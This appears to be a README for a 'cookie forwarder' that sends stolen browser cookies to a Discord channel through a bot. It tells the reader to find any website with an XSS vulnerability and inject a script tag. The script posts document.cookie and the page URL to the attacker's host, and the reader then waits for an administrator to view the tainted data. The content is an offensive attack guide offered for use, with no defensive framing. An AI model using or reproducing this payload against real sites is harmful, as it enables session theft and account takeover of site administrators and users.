# Cookie Forwarder Discord Channel
## Requirement
- Discord Developer Account
- Node JS Hosting
- Website Target
---
## Steps
- Create discord bot (ref: https://buddy.works/tutorials/how-to-build-a-discord-bot-in-node-js-for-beginners)
- Write on .env, discord api key and channel id
- Find any website which have xss vuln
- Put this script on that input which have xss vuln
    ```js
   <script>fetch("{YOUR_HOST}/submit", {method: "POST", body: JSON.stringify({path: window.location.href, payload: document.cookie})})</script>
   ```
- Just wait till admin open that table which showing your data
